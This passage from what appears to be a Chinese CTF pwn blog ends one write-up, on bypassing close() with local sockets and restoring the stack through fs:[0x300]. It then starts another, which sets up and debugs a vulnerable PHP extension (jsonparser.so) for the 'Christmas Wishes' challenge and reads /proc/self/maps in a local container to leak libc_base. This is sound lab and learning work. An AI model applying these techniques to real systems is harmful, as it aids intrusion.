class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot listen the client connect request&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        unlink(CAN_SERVICE);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 接受connect请求 </span></span><br><span class="line">    len=<span class="keyword">sizeof</span>(clt_addr);  </span><br><span class="line">    accept_fd=accept(socket_fd,(struct sockaddr*)&amp;clt_addr,&amp;len);  </span><br><span class="line">    <span class="keyword">if</span>(accept_fd&lt;<span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot accept client connect request&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        unlink(CAN_SERVICE);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 读取和写入  </span></span><br><span class="line">    <span class="built_in">memset</span>(recv_buf,<span class="number">0</span>,<span class="number">1024</span>);  </span><br><span class="line">    <span class="keyword">int</span> num=read(accept_fd,recv_buf,<span class="keyword">sizeof</span>(recv_buf));  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Message from client (%d)) :%s\n&quot;</span>,num,recv_buf);    </span><br><span class="line">         </span><br><span class="line">    <span class="comment">// 关闭socket</span></span><br><span class="line">    close(accept_fd);  </span><br><span class="line">    close(socket_fd);  </span><br><span class="line">    unlink(CAN_SERVICE);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x40128a</span> &lt;main+<span class="number">148</span>&gt;    call   bind@plt                      &lt;bind@plt&gt;</span><br><span class="line">       fd: <span class="number">0x3</span> (socket:[<span class="number">162182</span>])</span><br><span class="line">       addr: <span class="number">0x7fffffffde00</span> ◂— <span class="number">0x420001</span> <span class="comment">// serv_addr </span></span><br><span class="line">       len: <span class="number">0x6e</span></span><br></pre></td></tr></table></figure>
<ul>
<li>保证 bind 的 <code>serv_addr</code> 和 SYS_connect 的一样就可以了</li>
</ul>
<hr>
<p><strong>小结：</strong></p>
<p>当时很坐牢，百思不得其解，赛后复现时才发现自己的知识点不到位，看了大佬们的 wp 后收获很多：</p>
<ul>
<li><code>mov rsp, fs:[0x300]</code> 这条指令可以恢复栈（fs 寄存器中装有 TLS）</li>
<li>利用 socket 本地进程间通信来绕过 close</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/" class="post-title-link" itemprop="url">PHP pwn环境搭建+so文件的调试</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-07-06 13:31:51" itemprop="dateCreated datePublished" datetime="2022-07-06T13:31:51+08:00">2022-07-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-09-02 09:34:22" itemprop="dateModified" datetime="2022-09-02T09:34:22+08:00">2022-09-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>17 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Christmas Wishes 复现</strong></p>
<p>这是个 PHP pwn，环境折腾了我一个下午（主要是 docker 的问题）</p>
<p>在 docker 文件夹下运行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>
<p><img src="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/1656684619344.png" alt="1656684619344"> </p>
<p>直接访问 <code>http://localhost:7777</code> 就可以了：</p>
<p><img src="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/1656684673290.png" alt="1656684673290"> </p>
<ul>
<li>有一次输入的机会</li>
</ul>
<p>下面是题目给我们的文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\Desktop\<span class="number">2022</span>暑假复现\ChristmasWishes\file2ctfer&gt;tree /F</span><br><span class="line">卷 OS 的文件夹 PATH 列表</span><br><span class="line">卷序列号为 <span class="number">1</span>AD1<span class="number">-822</span>C</span><br><span class="line">C:.</span><br><span class="line">│  docker-compose.yml</span><br><span class="line">│</span><br><span class="line">├─fpm</span><br><span class="line">│  │  Dockerfile</span><br><span class="line">│  │  flag</span><br><span class="line">│  │  jsonparser.so</span><br><span class="line">│  │  readflag</span><br><span class="line">│  │  start.sh</span><br><span class="line">│  │</span><br><span class="line">│  └─html</span><br><span class="line">│          index.php</span><br><span class="line">│          test.php</span><br><span class="line">│</span><br><span class="line">└─nginx</span><br><span class="line">    │  Dockerfile</span><br><span class="line">    │  nginx.conf</span><br><span class="line">    │  pwn.conf</span><br><span class="line">    │</span><br><span class="line">    └─<span class="keyword">static</span></span><br><span class="line">        │  index.html</span><br><span class="line">        │  style.css</span><br><span class="line">        │</span><br><span class="line">        ├─css</span><br><span class="line">        │      animate.css</span><br><span class="line">        │      bootstrap-theme.css</span><br><span class="line">        │      bootstrap-theme.min.css</span><br><span class="line">        │      bootstrap.css</span><br><span class="line">        │      bootstrap.min.css</span><br><span class="line">        │      colors.css</span><br><span class="line">        │      custom.css</span><br><span class="line">        │      flaticon.css</span><br><span class="line">        │      font-awesome.css</span><br><span class="line">        │      font-awesome.min.css</span><br><span class="line">        │      owl.carousel.css</span><br><span class="line">        │      prettyPhoto.css</span><br><span class="line">        │      responsive.css</span><br><span class="line">        │      versions.css</span><br><span class="line">        │</span><br><span class="line">        ├─fonts</span><br><span class="line">        │      flaticon.css</span><br><span class="line">        │      Flaticon.eot</span><br><span class="line">        │      flaticon.html</span><br><span class="line">        │      Flaticon.svg</span><br><span class="line">        │      Flaticon.ttf</span><br><span class="line">        │      Flaticon.woff</span><br><span class="line">        │      fontawesome-webfont.eot</span><br><span class="line">        │      fontawesome-webfont.svg</span><br><span class="line">        │      fontawesome-webfont.ttf</span><br><span class="line">        │      fontawesome-webfont.woff</span><br><span class="line">        │      fontawesome-webfont.woff2</span><br><span class="line">        │      FontAwesome.otf</span><br><span class="line">        │      glyphicons-halflings-regular.eot</span><br><span class="line">        │      glyphicons-halflings-regular.svg</span><br><span class="line">        │      glyphicons-halflings-regular.ttf</span><br><span class="line">        │      glyphicons-halflings-regular.woff</span><br><span class="line">        │      glyphicons-halflings-regular.woff2</span><br><span class="line">        │      _flaticon.scss</span><br><span class="line">        │</span><br><span class="line">        ├─images</span><br><span class="line">        │  │  ajax-loader.gif</span><br><span class="line">        │  │</span><br><span class="line">        │  └─prettyPhoto</span><br><span class="line">        │      ├─dark_rounded</span><br><span class="line">        │      │      btnNext.png</span><br><span class="line">        │      │      btnPrevious.png</span><br><span class="line">        │      │      contentPattern.png</span><br><span class="line">        │      │      default_thumbnail.gif</span><br><span class="line">        │      │      loader.gif</span><br><span class="line">        │      │      sprite.png</span><br><span class="line">        │      │</span><br><span class="line">        │      ├─dark_square</span><br><span class="line">        │      │      btnNext.png</span><br><span class="line">        │      │      btnPrevious.png</span><br><span class="line">        │      │      contentPattern.png</span><br><span class="line">        │      │      default_thumbnail.gif</span><br><span class="line">        │      │      loader.gif</span><br><span class="line">        │      │      sprite.png</span><br><span class="line">        │      │</span><br><span class="line">        │      ├─<span class="keyword">default</span></span><br><span class="line">        │      │      default_thumb.png</span><br><span class="line">        │      │      loader.gif</span><br><span class="line">        │      │      sprite.png</span><br><span class="line">        │      │      sprite_next.png</span><br><span class="line">        │      │      sprite_prev.png</span><br><span class="line">        │      │      sprite_x.png</span><br><span class="line">        │      │      sprite_y.png</span><br><span class="line">        │      │</span><br><span class="line">        │      ├─facebook</span><br><span class="line">        │      │      btnNext.png</span><br><span class="line">        │      │      btnPrevious.png</span><br><span class="line">        │      │      contentPatternBottom.png</span><br><span class="line">        │      │      contentPatternLeft.png</span><br><span class="line">        │      │      contentPatternRight.png</span><br><span class="line">        │      │      contentPatternTop.png</span><br><span class="line">        │      │      default_thumbnail.gif</span><br><span class="line">        │      │      loader.gif</span><br><span class="line">        │      │      sprite.png</span><br><span class="line">        │      │</span><br><span class="line">        │      ├─light_rounded</span><br><span class="line">        │      │      btnNext.png</span><br><span class="line">        │      │      btnPrevious.png</span><br><span class="line">        │      │      default_thumbnail.gif</span><br><span class="line">        │      │      loader.gif</span><br><span class="line">        │      │      sprite.png</span><br><span class="line">        │      │</span><br><span class="line">        │      └─light_square</span><br><span class="line">        │              btnNext.png</span><br><span class="line">        │              btnPrevious.png</span><br><span class="line">        │              default_thumbnail.gif</span><br><span class="line">        │              loader.gif</span><br><span class="line">        │              sprite.png</span><br><span class="line">        │</span><br><span class="line">        ├─imgs</span><br><span class="line">        │      banner1.png</span><br><span class="line">        │      fevicon.png</span><br><span class="line">        │      loading.gif</span><br><span class="line">        │</span><br><span class="line">        └─js</span><br><span class="line">                all.js</span><br><span class="line">                animate.js</span><br><span class="line">                custom.js</span><br><span class="line">                hoverdir.js</span><br><span class="line">                jquery.prettyPhoto.js</span><br><span class="line">                jquery.vide.js</span><br><span class="line">                <span class="built_in">map</span>.js</span><br><span class="line">                modernizer.js</span><br><span class="line">                owl.carousel.js</span><br><span class="line">                portfolio.js</span><br><span class="line">                retina.js</span><br><span class="line">                scroll.js</span><br></pre></td></tr></table></figure>
<p>通过 Dockerfile 可以获取远程环境的信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  fpm cat Dockerfile         </span><br><span class="line">FROM php:<span class="number">7.4</span>-fpm</span><br><span class="line"></span><br><span class="line">RUN sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.<span class="built_in">list</span> &amp;&amp;\</span><br><span class="line">    apt-get update</span><br><span class="line"></span><br><span class="line">COPY html /var/www/html</span><br><span class="line">COPY flag /flag</span><br><span class="line">COPY readflag where_is_your_gift</span><br><span class="line">COPY jsonparser.so /usr/local/lib/php/extensions/no-debug-non-zts<span class="number">-20190902</span>/jsonparser.so</span><br><span class="line"></span><br><span class="line">RUN chmod <span class="number">400</span> /flag &amp;&amp;\</span><br><span class="line">    chmod <span class="number">4111</span> where_is_your_gift &amp;&amp;\</span><br><span class="line">    chmod -R <span class="number">555</span> /var/www/html &amp;&amp;\</span><br><span class="line">    echo <span class="string">&quot;extension=/usr/local/lib/php/extensions/no-debug-non-zts-20190902/jsonparser.so&quot;</span> &gt; /usr/local/etc/php/conf.d/jsonparser.ini% </span><br></pre></td></tr></table></figure>
<ul>
<li>7.4 版本的 php</li>
<li>在 fpm 中有一个 jsonparser.so</li>
</ul>
<p><strong>PHP 扩展的相关知识</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013756836/article/details/106688783#:~:text=PHP中扩展通过zend_module_entry这个结构来表示，此结构定义了扩展的全部信息：扩展名、扩展版本、扩展提供的函数列表以及PHP四个执行阶段的hook函数等，每一个扩展都需要定义一个此结构的变量，而且这个变量的名称格式必须是：,{module_name}_module_entry，内核正是通过这个结构获取到扩展提供的功能的。">【走进php内核】之扩展的实现原理</a> </li>
</ul>
<p>PHP 是一种脚本语言，需要用解释器 php-cgi（c 语言写的）才能完成底层的工作，其核心就是对 PHP 字符的处理，而 PHP 扩展就是增强 PHP 语言功能的插件</p>
<p>PHP 提供了编程语言的语法，比如分支、循环、函数、类等，这些是 PHP 本身所提供的，在某些情况下需要在 PHP 语言的基础上进行扩展，那么就需要通过 PHP 底层提供的数据结构和接口来开发 PHP 扩展，从而来补充或扩展 PHP 语言，使之更加的强大</p>
<ul>
<li>PHP pwn 的漏洞往往就在 PHP 扩展中</li>
</ul>
<p>PHP 中扩展通过 zend_module_entry 这个结构来表示，此结构定义了扩展的全部信息：</p>
<ul>
<li>扩展名</li>
<li>扩展版本</li>
<li>扩展提供的函数列表</li>
<li>PHP 四个执行阶段的 hook 函数</li>
</ul>
<p>每一个扩展都需要定义一个此结构的变量，而且这个变量的名称格式必须是：</p>
<ul>
<li>{module_name}_module_entry（内核正是通过这个结构获取到扩展提供的功能的）</li>
</ul>
<p>扩展可以在编译 PHP 时一起编译(静态编译)，也可以单独编译为动态库，动态库需要加入到 php.ini 配置中去，然后在 php_module_startup() 阶段把这些动态库加载到 PHP 中 </p>
<ul>
<li>关于 php.ini 的配置可以参考这篇博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/lgx1134569285/article/details/80655958">php.ini 配置扩展</a> </li>
</ul>
<p>在 Dockerfile 中可以看到 jsonparser.so 就是题目环境的 PHP 扩展模块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COPY jsonparser.so /usr/local/lib/php/extensions/no-debug-non-zts<span class="number">-20190902</span>/jsonparser.so</span><br></pre></td></tr></table></figure>
<ul>
<li>可以用 IDA 分析 jsonparser.so</li>
</ul>
<p>关于 PHP pwn 可以先学习：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.redhatzone.com/ask/article/1176.html#:~:text=WEBPWN类型,m是不太可行的。">WEBPWN入门级调试讲解_红帽社区</a> </li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235237#h2-0">WebPwn：php-pwn学习 - 安全客</a> </li>
</ul>
<p>先 checksec jsonparser.so：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>保护全开</li>
</ul>
<p><strong>尝试直接用题目所给的 .so 来进行调试</strong></p>
<p>将 jsonparser.so 放入本地 <code>php</code> 拓展库路径下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 php -i | grep -i extension_dir</span><br><span class="line">extension_dir =&gt; /usr/lib/php/<span class="number">20190902</span> =&gt; /usr/lib/php/<span class="number">20190902</span></span><br></pre></td></tr></table></figure>
<p>随后在 <code>php.ini</code> 配置文件的末尾，添加如下代码： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extensions=jsonparser.so</span><br></pre></td></tr></table></figure>
<p>可以用 find 命令来查找 <code>php.ini</code> 的位置：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ChristmasWishes sudo find / -name <span class="string">&quot;php.ini&quot;</span></span><br><span class="line">/etc/php/<span class="number">7.4</span>/cli/php.ini</span><br><span class="line">/etc/php/<span class="number">7.4</span>/fpm/php.ini</span><br></pre></td></tr></table></figure>
<p>预计效果：（”phppwn” 是本地测试模块）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ChristmasWishes php test.php | grep <span class="string">&quot;phppwn&quot;</span>    </span><br><span class="line">phppwn</span><br><span class="line">phppwn support =&gt; enabled</span><br><span class="line">➜  ChristmasWishes php test.php | grep <span class="string">&quot;jsonparser&quot;</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>很可惜没有出现预期结果，可能是 php 版本的原因</li>
<li>如果加载成功，就可以直接通过 <code>gdb php</code> 来调试 .so 文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555627000</span> r--p    d3000 <span class="number">0</span>      /usr/bin/php7<span class="number">.4</span></span><br><span class="line">    <span class="number">0x555555627000</span>     <span class="number">0x55555588f000</span> r-xp   <span class="number">268000</span> d3000  /usr/bin/php7<span class="number">.4</span></span><br><span class="line">    <span class="number">0x55555588f000</span>     <span class="number">0x555555955000</span> r--p    c6000 <span class="number">33b</span>000 /usr/bin/php7<span class="number">.4</span></span><br><span class="line">    <span class="number">0x555555955000</span>     <span class="number">0x5555559e0000</span> r--p    <span class="number">8b</span>000 <span class="number">400000</span> /usr/bin/php7<span class="number">.4</span></span><br><span class="line">    <span class="number">0x5555559e0000</span>     <span class="number">0x5555559e2000</span> rw-p     <span class="number">2000</span> <span class="number">48b</span>000 /usr/bin/php7<span class="number">.4</span></span><br><span class="line">    <span class="number">0x5555559e2000</span>     <span class="number">0x555555b9c000</span> rw-p   <span class="number">1b</span>a000 <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7ffff41c0000</span>     <span class="number">0x7ffff4241000</span> rw-p    <span class="number">81000</span> <span class="number">0</span>      [anon_7ffff41c0]</span><br><span class="line">    ......</span><br><span class="line"> /usr/lib/php/<span class="number">20190902</span>/phppwn.so</span><br><span class="line">    <span class="number">0x7ffff7fc5000</span>     <span class="number">0x7ffff7fc6000</span> r-xp     <span class="number">1000</span> <span class="number">1000</span>   /usr/lib/php/<span class="number">20190902</span>/phppwn.so</span><br><span class="line">    <span class="number">0x7ffff7fc6000</span>     <span class="number">0x7ffff7fc7000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /usr/lib/php/<span class="number">20190902</span>/phppwn.so</span><br><span class="line">    <span class="number">0x7ffff7fc7000</span>     <span class="number">0x7ffff7fc8000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /usr/lib/php/<span class="number">20190902</span>/phppwn.so</span><br><span class="line">    <span class="number">0x7ffff7fc8000</span>     <span class="number">0x7ffff7fc9000</span> rw-p     <span class="number">1000</span> <span class="number">3000</span>   /usr/lib/php/<span class="number">20190902</span>/phppwn.so</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现：样例 phppwn.so 已经成功加载进去了（但是 jsonparser.so 没有加载）</li>
</ul>
<p><strong>利用 dlsym 进行调试</strong></p>
<p>参考了以下博客：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jeff_Dean/article/details/106464499">dlsym用法</a></li>
</ul>
<p>dlsym：从一个动态链接库或者可执行文件中获取到符号地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">dlsym</span><span class="params">(<span class="keyword">void</span> *handle, <span class="keyword">const</span> <span class="keyword">char</span> *symbol)</span></span>;</span><br><span class="line"><span class="comment">/* Link with -ldl */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>handle 参数：一个指向已经加载的动态目标的句柄，这个句柄可以是 dlopen() 函数返回的</li>
<li>symbol 参数：是一个以 null 结尾的符号名</li>
<li>返回：符号对应的地址</li>
</ul>
<p>把某个地址存入函数指针，就可以执行这个函数了，通过这种方式就可以执行并调试有漏洞的函数</p>
<p><strong>信息收集：远程</strong></p>
<p>进入容器内部：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND                  CREATED        STATUS              PORTS                                   NAMES</span><br><span class="line"><span class="number">177162</span>d1fe91   docker_nginx   <span class="string">&quot;/docker-entrypoint.…&quot;</span>   <span class="number">24</span> hours ago   Up About a minute   <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">7777</span>-&gt;<span class="number">80</span>/tcp, :::<span class="number">7777</span>-&gt;<span class="number">80</span>/tcp   docker_nginx_1</span><br><span class="line"><span class="number">18b</span>7ee65e760   docker_fpm     <span class="string">&quot;docker-php-entrypoi…&quot;</span>   <span class="number">24</span> hours ago   Up About a minute   <span class="number">9000</span>/tcp                                docker_fpm_1</span><br><span class="line">➜  桌面 docker exec -it <span class="number">18b</span>7ee65e760 /bin/bash</span><br><span class="line">root@<span class="number">18b</span>7ee65e760:/var/www/html<span class="meta"># ls</span></span><br></pre></td></tr></table></figure>
<p>执行 <code>/proc/self/maps</code> 获取远程 libc_base：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">18b</span>7ee65e760:/<span class="meta"># cat /proc/self/maps</span></span><br><span class="line"><span class="number">5580f</span>1ba4000<span class="number">-5580f</span>1ba6000 r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525282</span>                     /bin/cat</span><br><span class="line"><span class="number">5580f</span>1ba6000<span class="number">-5580f</span>1bab000 r-xp <span class="number">00002000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525282</span>                     /bin/cat</span><br><span class="line"><span class="number">5580f</span>1bab000<span class="number">-5580f</span>1bae000 r--p <span class="number">00007000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525282</span>                     /bin/cat</span><br><span class="line"><span class="number">5580f</span>1bae000<span class="number">-5580f</span>1baf000 r--p <span class="number">00009000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525282</span>                     /bin/cat</span><br><span class="line"><span class="number">5580f</span>1baf000<span class="number">-5580f</span>1bb0000 rw-p <span class="number">0000</span>a000 <span class="number">00</span>:<span class="number">3b</span> <span class="number">525282</span>                     /bin/cat</span><br><span class="line"><span class="number">5580f</span>20e1000<span class="number">-5580f</span>2102000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                          [heap]</span><br><span class="line"><span class="number">7f</span>74de8f2000<span class="number">-7f</span>74de914000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">7f</span>74de914000<span class="number">-7f</span>74de939000 r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525618</span>                     /lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74de939000<span class="number">-7f</span>74dea84000 r-xp <span class="number">00025000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525618</span>                     /lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74dea84000<span class="number">-7f</span>74deace000 r--p <span class="number">00170000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525618</span>                     /lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74deace000<span class="number">-7f</span>74deacf000 ---p <span class="number">001b</span>a000 <span class="number">00</span>:<span class="number">3b</span> <span class="number">525618</span>                     /lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74deacf000<span class="number">-7f</span>74dead2000 r--p <span class="number">001b</span>a000 <span 